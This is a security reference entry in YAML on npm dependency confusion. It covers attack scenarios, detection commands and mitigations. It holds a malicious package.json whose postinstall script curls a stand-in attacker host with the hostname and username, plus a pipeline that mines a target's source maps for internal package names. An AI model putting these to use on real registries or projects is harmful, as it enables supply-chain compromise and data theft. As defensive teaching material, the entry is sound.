---
name: "Dependency Confusion"
packageManager: "npm"
slug: "npm-dependency-confusion"
category: "Dependency Confusion"
severity: "high"
platform:
  - "Linux"
  - "macOS"
  - "Windows"
description: "Dependency confusion exploits the way npm resolves package names by publishing a public package with the same name as a private, internally-used package. When an organization uses unscoped package names for internal libraries and does not properly configure their .npmrc registry settings, npm may fetch the attacker's public version instead. Attackers discover internal package names by analyzing JavaScript source maps, lock files, or error messages exposed in web applications."
prerequisites:
  - "Target organization uses unscoped private package names (not @org/pkg)"
  - "Ability to discover internal package names via source maps, lock files, or leaked configuration"
  - "Ability to publish packages to the public npm registry"
attackScenarios:
  - title: "Publishing a Public Package Matching an Internal Name"
    description: "An attacker discovers that a company uses an internal package called 'acme-internal-auth' by inspecting a leaked package-lock.json. The attacker publishes a public package with the same name and a higher version number containing a postinstall script that phones home."
    commands:
      - label: "Malicious package.json for the public impersonation"
        code: |
          {
            "name": "acme-internal-auth",
            "version": "99.0.0",
            "scripts": {
              "postinstall": "curl https://evil.example.com/callback?host=$(hostname)&user=$(whoami)"
            }
          }
        language: "json"
      - label: "Publishing the confusion package"
        code: |
          npm publish
        language: "bash"
  - title: "Discovering Internal Package Names from Source Maps"
    description: "Source maps bundled with production JavaScript files often contain import paths and module names. An attacker downloads exposed .map files and extracts internal package references to use as dependency confusion targets."
    commands:
      - label: "Extracting package names from a source map"
        code: |
          curl -s https://target.example.com/static/js/main.js.map \
            | jq -r '.sources[]' \
            | grep 'node_modules' \
            | sed 's|.*node_modules/||' \
            | cut -d'/' -f1-2 \
            | sort -u
        language: "bash"
  - title: "Exploiting Misconfigured Registry Fallback"
    description: "When a project uses a proxy registry (such as Artifactory or Nexus) that is configured to proxy the public npm registry, the proxy may resolve unscoped packages from the public registry if the private registry returns a 404. Note: this is a behavior of proxy registries, not the npm client itself. The attacker publishes a higher version publicly to win the resolution."
    commands:
      - label: "Vulnerable .npmrc with unrestricted fallback"
        code: |
          registry=https://private-registry.example.com/
          # No scoping restriction — npm will fall back to public registry
        language: "ini"
detection:
  - title: "Verify Package Registry Origins"
    description: "Check the resolved URLs in package-lock.json to ensure all packages are being fetched from the expected registry. Flag any packages resolving to the public npm registry that should be private."
    commands:
      - code: "grep -E '\"resolved\":' package-lock.json | grep -v 'private-registry.example.com' | head -20"
        language: "bash"
  - title: "Audit for Unscoped Internal Packages"
    description: "Review your dependency tree for unscoped package names that match internal libraries. These are vulnerable to confusion attacks."
    commands:
      - code: "npm ls --all 2>/dev/null | grep -v '@' | grep -v 'npm warn'"
        language: "bash"
mitigation:
  - "Always use scoped packages (@org/package-name) for internal libraries to prevent public name collisions"
  - "Configure .npmrc to restrict specific scopes to the private registry using @org:registry=https://private-registry.example.com/"
  - "Claim your internal package names on the public npm registry as placeholders, even if they are private"
  - "Enable npm provenance and use lockfile integrity checks to detect unexpected registry changes"
references:
  - title: "Dependency Confusion: How I Hacked Into Apple, Microsoft and Dozens of Other Companies - Alex Birsan"
    url: "https://medium.com/@alex.birsan/dependency-confusion-4a5d60fec610"
  - title: "npm Scoped Packages Documentation"
    url: "https://docs.npmjs.com/cli/v10/using-npm/scope"
  - title: "GitHub Advisory Database - Dependency Confusion"
    url: "https://github.com/advisories?query=dependency+confusion"
created: 2026-04-02
updated: 2026-04-02
---
